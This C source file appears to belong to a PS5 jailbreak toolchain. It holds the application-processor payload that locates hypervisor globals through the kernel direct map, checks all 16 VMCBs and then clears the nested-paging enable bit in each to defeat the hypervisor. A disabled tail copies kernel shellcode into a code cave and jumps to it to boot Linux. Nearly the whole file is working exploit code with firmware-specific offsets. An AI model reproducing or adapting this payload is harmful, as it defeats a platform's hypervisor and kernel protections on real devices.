/* shellcode_ap -- the AP payload entry point.
 *
 * Derived from byepervisor_reborn break_hv_payload/break_hv.c. The important difference:
 * upstream writes its oracle cookie and then does the hypervisor work UNCONDITIONALLY, so its
 * "defeated" notification proves only that the hook fired -- not that the HV-touching reads
 * and writes were correct, because they happen after the cookie. This version runs a
 * READ-ONLY validation first and only writes if all 16 VMCBs check out.
 *
 * Runs with the kernel's CR3 and, in the S3 resume window, no nested paging -- so `dmap +
 * phys` reaches hypervisor physical memory. Position independent: no globals, no absolute
 * addressing; everything goes through the parameter pointer.
 *
 * This is the file that decides whether the whole route works. Its stage codes are readable
 * afterwards from the oracle (kernel DATA_CAVE + 0x440) and the result block at
 * carrier+0xF40 -- neither needs this code to still be running. */

typedef unsigned long long u64;
typedef unsigned int       u32;

#define P_INIT_CB       0
#define P_DMAP          1
#define P_ORACLE        2
#define P_HV            3   /* H: the carveout base */
#define P_HEAPOFF_ADDR  4   /* H + 0x83028 : address OF the hv_heap_offset global */
#define P_PCPUS_ADDR    5   /* H + 0x82A60 : address OF pcpus[] */
#define P_MODE          6   /* 0 = validate only, 1 = apply the defeat */
#define P_RES_BASE      8   /* [8 .. 23] per-core VMCB physical address */
#define P_NVALID        24
#define P_HEAPVAL       25
#define P_PCPU0VAL      26
#define P_SCK_DST       27  /* KERNEL_CODE_CAVE: executable dest for shellcode_kernel */
#define P_SCK_SRC       28  /* staged (args-patched) shellcode_kernel blob, kernel VA */
#define P_SCK_LEN       29  /* shellcode_kernel length in bytes */
#define P_HV_SIZE       30  /* real measured carveout size (bytes); was a hardcoded constant
                              * (0x2029000, devkit/base) until 2026-10-18 -- PS5 Pro retail's
                              * real carveout measures 0x2000000, ~164KB smaller, so the old
                              * constant let the bounds checks below accept physical addresses
                              * just past the real carveout on Pro. Now threaded from the same
                              * EFI-metadata measurement hv_defeat_13xx.c already does for H. */

#define ORACLE_ENTERED  0x0000000000001100ULL
#define ORACLE_HEAP_OK  0x0000000000001200ULL
#define ORACLE_CENSUS   0x0000000000001300ULL
#define ORACLE_DEFEAT   0x0000000000001400ULL
#define ORACLE_FAIL     0x000000000000F000ULL

#define VMCB_NESTED_CTRL 0x90
#define VMCB_NESTED_CR3  0xB0
#define VMCB_CONTROL2    0xB8
#define VMCB_CLEAN       0xC0
#define VMCB_M_VMCB      0xA8   /* pcpu_t::GameOS m_vmcb */
#define NESTED_CTRL_INIT 9      /* NP_ENABLE | GMET, observed at runtime */

static inline u64  rd64(u64 a)        { return *(volatile u64 *)a; }
static inline void wr64(u64 a, u64 v) { *(volatile u64 *)a = v; }
static inline void wr32(u64 a, u32 v) { *(volatile u32 *)a = v; }

void ap_main(u64 *p)
{
  u64 dmap   = p[P_DMAP];
  u64 oracle = p[P_ORACLE];
  u64 H      = p[P_HV];
  u64 hv_size = p[P_HV_SIZE];

  wr64(oracle, ORACLE_ENTERED);

  /* ---- stage 1: can we even see the hypervisor's own globals? ------------------------
   * hv_heap_offset is the HV's VA->PA base: the HV converts its own pointers with
   * `phys = va - hv_heap_offset`. pcpus[] holds a VA per core. So pcpus[0] - heap must land
   * INSIDE the carveout. This single check is what tells us whether the resume window really
   * gives this AP the hypervisor's memory view -- the exact point our two findings disagree
   * about. */
  u64 heap  = rd64(dmap + p[P_HEAPOFF_ADDR]);
  u64 pcpu0 = rd64(dmap + p[P_PCPUS_ADDR]);
  u64 heap_addr = p[P_HEAPOFF_ADDR], pcpus_addr = p[P_PCPUS_ADDR];

  /* ---- stage 1b: if the supplied offsets are wrong, FIND them -------------------
   * HV_PCPUS_OFF/HV_HEAPOFF_OFF are 13.x values (they match upstream Reborn, which only
   * ever supported 13.x). On another firmware they point at the wrong thing, the test
   * below fails, and this function returns having done NOTHING -- no defeat, no Linux,
   * and no panic either. That is precisely what 11.00 did.
   *
   * So rather than trust them, scan for a pair that satisfies the same invariant. Both
   * 13.x globals live in 0x80000..0x90000, so that is the window; it is an assumption
   * about layout stability, which is why whatever is found is REPORTED (P_HEAPVAL,
   * P_PCPU0VAL and the addresses below) instead of being used silently.
   *
   * A pair qualifies only if FOUR consecutive core slots are either null or map into the
   * carveout. One slot matching by luck is plausible; four is not. */
  if (!heap || pcpu0 < heap || (pcpu0 - heap) < H || (pcpu0 - heap) >= H + hv_size) {
    u64 ha, pa_, ok = 0;
    for (ha = H + 0x80000; ha < H + 0x90000 && !ok; ha += 8) {
      u64 h2 = rd64(dmap + ha);
      if (!h2) continue;
      for (pa_ = H + 0x80000; pa_ < H + 0x90000; pa_ += 8) {
        u64 good = 0, seen = 0, c;
        for (c = 0; c < 4; c++) {
          u64 v = rd64(dmap + pa_ + c * 8);
          if (!v) continue;
          seen++;
          if (v < h2) break;
          if ((v - h2) < H || (v - h2) >= H + hv_size) break;
          if ((v - h2) & 0xFFF) break;
          good++;
        }
        if (seen >= 2 && good == seen) {
          heap = h2; pcpu0 = rd64(dmap + pa_);
          heap_addr = ha; pcpus_addr = pa_;
          p[P_HEAPOFF_ADDR] = ha; p[P_PCPUS_ADDR] = pa_;
          ok = 1; break;
        }
      }
    }
    if (!ok) { wr64(oracle, ORACLE_FAIL | 3); return; }   /* searched and found nothing */
  }

  p[P_HEAPVAL]  = heap;
  p[P_PCPU0VAL] = pcpu0;

  if (!heap || pcpu0 < heap) { wr64(oracle, ORACLE_FAIL | 1); return; }

  u64 pcpu0_pa = pcpu0 - heap;
  if (pcpu0_pa < H || pcpu0_pa >= H + hv_size) { wr64(oracle, ORACLE_FAIL | 2); return; }

  wr64(oracle, ORACLE_HEAP_OK);

  /* ---- stage 2: census all 16 VMCBs, READ ONLY -------------------------------------- */
  u64 nvalid = 0;
  for (int core = 0; core < 16; core++) {
    p[P_RES_BASE + core] = 0;

    u64 pcpu = rd64(dmap + p[P_PCPUS_ADDR] + (u64)core * 8);
    if (!pcpu) continue;

    u64 vmcb = rd64(dmap + (pcpu - heap) + VMCB_M_VMCB);
    if (!vmcb) continue;

    u64 vmcb_pa = vmcb - heap;
    if (vmcb_pa & 0xFFF) continue;
    if (vmcb_pa < H || vmcb_pa >= H + hv_size) continue;

    p[P_RES_BASE + core] = vmcb_pa;

    u32 nc   = *(volatile u32 *)(dmap + vmcb_pa + VMCB_NESTED_CTRL);
    u32 c2   = *(volatile u32 *)(dmap + vmcb_pa + VMCB_CONTROL2);
    u64 ncr3 = rd64(dmap + vmcb_pa + VMCB_NESTED_CR3);

    if ((nc & 0xFF) == NESTED_CTRL_INIT && c2 == 1 && ncr3 && (ncr3 & 0xFFF) == 0)
      nvalid++;
  }
  p[P_NVALID] = nvalid;
  wr64(oracle, ORACLE_CENSUS | nvalid);

  /* A partial census means our idea of H or of the pcpus layout is wrong. Do not write. */
  if (nvalid != 16) return;

  /* Mode 0 is the read-only run: everything above, nothing below. */
  if (p[P_MODE] != 1) return;

  /* ---- stage 3: the actual defeat --------------------------------------------------- */
  for (int core = 0; core < 16; core++) {
    u64 vmcb_pa = p[P_RES_BASE + core];
    if (!vmcb_pa) continue;

    u64 old = rd64(dmap + vmcb_pa + VMCB_NESTED_CTRL);
    wr64(dmap + vmcb_pa + VMCB_NESTED_CTRL, old & ~1ULL);  /* NP_ENABLE off */
    wr32(dmap + vmcb_pa + VMCB_CLEAN, 0);                  /* force reload on VMRUN */
  }
  wr64(oracle, ORACLE_DEFEAT);
}

#if 0  /* RE-REVERTED 2026-10-18: this DB-CHAIN tail (cpuid stage3b + cave-copy/jump stage4) was
        * tried on 13.20 as a non-FACS delivery path. Result: identical Fatal trap 12 at
        * Resume 'SceIccThermal' as khook-only, PLUS the following cold-reboot then hung
        * indefinitely (blue-pulsing, no UART output for minutes) instead of completing --
        * worse than before. 13.20 work is paused entirely (see
        * feedback_pause_1320_pivot_1160.md). Dead code, kept for reference only; do not
        * re-enable without re-deriving from scratch. */
static void ap_main_tail(u64 *p, u64 oracle)
{
  /* ---- stage 3b: make NP-off actually take effect for THIS core ----------------------
   * We just cleared NP_ENABLE (VMCB ctrl 0x90 bit0) and VMCB_CLEAN (0xC0) on every VMCB, but NP
   * is latched by VMRUN at guest entry -- this core is still running with NP ON until it #VMEXITs
   * and the HV re-VMRUNs it (which now reloads the NP-cleared VMCB because the clean bit is 0).
   * Without this, the very next write below (into the cave / kernel .text) faults in the nested
   * tables: VMEXIT 0x400 at the cave gPA, error 0x100000007 (present, WRITE) -- the exact 13.20
   * death, because on 13.20 the cave's nested mapping is write-protected (it is RWX on 13.60, which
   * is the only reason the identical code boots there). CPUID is unconditionally intercepted under
   * SVM, so it forces the #VMEXIT->VMRUN cycle; we return here with NP OFF, and now nested paging is
   * gone so the cave and .text are writable exactly as they are on 13.60's late delivery. */
  {
    unsigned int ra = 0, rb = 0, rc = 0, rd = 0;
    __asm__ volatile("cpuid" : "+a"(ra), "=b"(rb), "=c"(rc), "=d"(rd));
    wr64(oracle, ORACLE_DEFEAT | 0xA0);  /* 0x14A0: forced VMRUN done, NP should now be OFF */
  }

  /* ---- stage 4: deliver shellcode_kernel (boot_linux) -------------------------------
   * The FACS #GP trigger the loader used to raise shellcode_kernel is dead on PS5 (proven by
   * IDA + hardware: the corrupted AcpiGbl_FACS store never faults into our IST). Instead,
   * NOW -- in this same resume window, immediately after NP is off and the HV is defeated --
   * jump straight into shellcode_kernel, which the loader pre-copied to KERNEL_CODE_CAVE and
   * whose args pointer prepare_resume already patched. It never returns (it boots Linux).
   * Only the invocation that completed the full 16/16 defeat reaches here, so exactly one
   * core performs the handoff. */
  u64 dst = p[P_SCK_DST], src = p[P_SCK_SRC], len = p[P_SCK_LEN];
  if (dst && src && len) {
    wr64(oracle, ORACLE_DEFEAT | 0xB0);  /* 0x14B0: copying shellcode_kernel into the cave */
    /* Same two steps the proven FACS ROP did AT RESUME: copy the staged blob into the executable
     * KERNEL_CODE_CAVE, then jump. We run with the kernel's CR3 and NP off, so these kernel VAs are
     * directly usable and the cave is writable+executable exactly as it was for the ROP. Byte copy
     * (len is not guaranteed 8-aligned). Position-independent: everything via the param pointer. */
    volatile unsigned char *d = (volatile unsigned char *)dst;
    volatile unsigned char *s = (volatile unsigned char *)src;
    for (u64 i = 0; i < len; i++) d[i] = s[i];
    wr64(oracle, ORACLE_DEFEAT | 0xB1);  /* 0x14B1: copy done, jumping into shellcode_kernel */
    ((void (*)(u64, u64))dst)(0, 0);     /* -> boot_linux; never returns */
  }
}
#endif
